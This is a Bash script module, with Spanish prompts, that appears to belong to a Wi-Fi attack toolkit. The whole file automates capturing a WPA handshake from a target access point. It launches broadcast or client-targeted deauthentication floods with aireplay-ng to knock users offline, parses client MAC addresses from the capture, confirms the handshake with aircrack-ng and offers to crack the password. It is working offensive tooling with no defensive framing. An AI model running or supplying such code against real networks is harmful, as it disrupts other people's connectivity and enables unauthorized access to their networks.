#!/bin/bash

# ==============================================================================
# ATTACKS: HANDSHAKE
# ==============================================================================

function capture_handshake() {
    banner
    ensure_mon_interface
    
    # Flag global para el trap de limpieza
    export HANDSHAKE_CAPTURED=0
    export full_cap_path=""
    
    # Escaneo modular
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        bssid="$TARGET_BSSID"
        channel="$TARGET_CHANNEL"
        default_name=$(echo "$TARGET_ESSID" | sed 's/ /_/g')
        read -p "Nombre para el archivo de captura (Enter para '$default_name'): " filename
        if [ -z "$filename" ]; then filename="$default_name"; fi
    else
        echo -e "${YELLOW}[!] Pasando a modo manual...${NC}"
        read -p "Ingresa el BSSID del objetivo: " bssid
        read -p "Ingresa el CANAL del objetivo: " channel
        read -p "Ingresa un nombre para el archivo de captura: " filename
    fi
    
    full_cap_path="$WORK_DIR/$filename"
    
    echo -e "${YELLOW}[*] Iniciando captura en canal $channel...${NC}"
    
    airodump_cmd="airodump-ng -c $channel --bssid $bssid -w $full_cap_path $mon_interface"
    run_in_new_terminal "$airodump_cmd" "Capturando Handshake - $bssid"
    
    echo -e "${YELLOW}[*] Esperando 5 segundos...${NC}"
    sleep 5
    
    while true; do
        clear
        banner
        echo -e "${YELLOW}╔════════════════ HANDSHAKE MENU ═════════════════╗${NC}"
        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" "Target: $default_name ($bssid)"
        echo -e "${YELLOW}╠══════════════════════════════════════════════════╣${NC}"
        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 1) Check Handshake (Verificar si ya capturamos)"
        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 2) Deauth Masiva (Broadcast)"
        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 3) Deauth Específica (Seleccionar Cliente)"
        printf "${YELLOW}║${NC} %-47s ${YELLOW}║${NC}\n" " 4) Volver al menú principal"
        echo -e "${YELLOW}╚══════════════════════════════════════════════════╝${NC}"
        echo ""
        
        # Verificar estado de captura (intentar -01.cap y el nombre base)
        cap_to_check=""
        if [ -f "${full_cap_path}-01.cap" ]; then
            cap_to_check="${full_cap_path}-01.cap"
        elif [ -f "${full_cap_path}.cap" ]; then
            cap_to_check="${full_cap_path}.cap"
        fi

        if [ ! -z "$cap_to_check" ] && aircrack-ng -b "$bssid" "$cap_to_check" 2>&1 | grep -q "1 handshake"; then
             echo -e "${GREEN}[!!!] HANDSHAKE CAPTURADO EXITOSAMENTE ${NC}"
             export HANDSHAKE_CAPTURED=1
             pkill -f "airodump-ng.*$bssid"
             read -p "¿Crackear ahora? (s/n): " crack_now
             if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                 crack_password_auto "$cap_to_check" "$bssid"
             fi
             break
        fi

        read -p "Opción: " hs_opt
        
        case $hs_opt in
            1)
                # La verificación ya se hace al inicio del loop, así que solo damos feedback visual
                echo -e "${YELLOW}[*] Verificando archivo de captura...${NC}"
                sleep 1
                ;;
            2)
                echo -e "${RED}[ATTACK] Enviando 10 paquetes de deauth (Broadcast)...${NC}"
                aireplay-ng -0 10 -a "$bssid" "$mon_interface"
                sleep 2
                ;;
            3)
                # Parsear clientes desde el CSV que está generando airodump en segundo plano
                csv_file="${full_cap_path}-01.csv"
                if [ ! -f "$csv_file" ]; then
                    echo -e "${RED}[!] Aún no hay datos de clientes. Espera un momento.${NC}"
                else
                    echo -e "\n${YELLOW}--- Clientes Detectados ---${NC}"
                    local count=0
                    local -a client_macs
                    
                    # Leer CSV ignorando la primera sección (APs) y buscando la sección Station MAC
                    in_stations=0
                    while IFS=',' read -r col1 col2 col3 col4 col5 col6 rest; do
                        col1=$(echo "$col1" | tr -d '[:space:]')
                        if [[ "$col1" == "StationMAC" ]]; then in_stations=1; continue; fi
                        
                        if [[ "$in_stations" == "1" && "$col1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                             # Ignorar si el cliente es el propio BSSID (a veces pasa en modo monitor)
                             if [[ "$col1" != "$bssid" ]]; then
                                 count=$((count+1))
                                 client_macs[$count]="$col1"
                                 power=$(echo "$col4" | tr -d '[:space:]')
                                 packets=$(echo "$col6" | tr -d '[:space:]')
                                 echo -e "$count) MAC: ${GREEN}$col1${NC} | Pwr: $power | Pkts: $packets"
                             fi
                        fi
                    done < "$csv_file"
                    
                    if [ "$count" -eq 0 ]; then
                        echo -e "${RED}[!] No se han detectado clientes activos aún.${NC}"
                    else
                        echo ""
                        read -p "Cliente a atacar (número): " c_sel
                        if [[ "$c_sel" -gt 0 && "$c_sel" -le "$count" ]]; then
                            target_client="${client_macs[$c_sel]}"
                            echo -e "${RED}[ATTACK] Enviando 10 paquetes a $target_client...${NC}"
                            aireplay-ng -0 10 -a "$bssid" -c "$target_client" "$mon_interface"
                        else
                            echo -e "${RED}[!] Selección inválida.${NC}"
                        fi
                    fi
                fi
                read -p "Presiona Enter para continuar..."
                ;;
            4)
                pkill -f "airodump-ng.*$bssid"
                echo -e "${YELLOW}[*] Eliminando archivos de captura incompletos...${NC}"
                rm -f "${full_cap_path}"*
                return
                ;;
            *) echo "Opción inválida." ;;
        esac
    done
}
